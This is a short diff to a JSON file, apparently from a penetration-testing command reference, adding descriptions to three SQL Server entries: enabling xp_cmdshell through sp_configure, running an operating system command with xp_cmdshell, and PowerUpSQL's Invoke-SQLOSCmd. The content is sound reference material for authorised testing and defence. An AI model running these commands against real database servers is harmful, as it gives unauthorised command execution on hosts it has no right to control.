@@ -210,15 +210,18 @@
   "variations": [
     {
       "label": "Enable + run in one query",
-      "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;"
+      "command": "EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;",
+      "description": "Executes operating system commands through SQL Server's xp_cmdshell stored procedure. Provides command-line access on the database server from a SQL connection."
     },
     {
       "label": "Run an OS command",
-      "command": "EXEC xp_cmdshell 'whoami'"
+      "command": "EXEC xp_cmdshell 'whoami'",
+      "description": "Executes operating system commands through SQL Server's xp_cmdshell stored procedure. Provides command-line access on the database server from a SQL connection."
     },
     {
       "label": "PowerUpSQL",
-      "command": "Invoke-SQLOSCmd -Instance <instance> -Command 'whoami' -RawResults"
+      "command": "Invoke-SQLOSCmd -Instance <instance> -Command 'whoami' -RawResults",
+      "description": "Executes operating system commands through SQL Server using PowerUpSQL. Leverages xp_cmdshell or other execution methods for command execution from a database compromise."
     }
   ],
   "steps": [
